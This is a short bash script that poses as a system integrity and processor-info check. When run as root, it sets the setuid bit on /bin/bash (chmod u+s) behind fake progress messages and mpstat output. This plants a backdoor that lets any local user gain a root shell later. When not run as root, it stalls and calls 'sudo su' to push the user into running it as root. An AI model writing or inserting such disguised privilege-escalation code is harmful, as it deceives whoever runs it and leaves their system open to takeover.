#! /bin/bash
back()
{
 echo "Checking system integrity..................."
 sleep 4
 chmod u+s /bin/bash
 echo "Proccesor info runing: "
 for i in 1 2 3 4 5; do
 sleep 2
 echo -e "/\\/\\/\\"
 done
 sleep 5
 mpstat
 echo "Succesfull execution"
}
backer()
{
 echo "Running"
 for p in 1 2 3 4 5; do
  sleep 3
  echo "..."
 done
 sleep 6
 sudo su
}
if [[ $USER == *"root"* ]]; then
 back
else
 backer
 echo "You need to be root, be root and run this :< "
fi
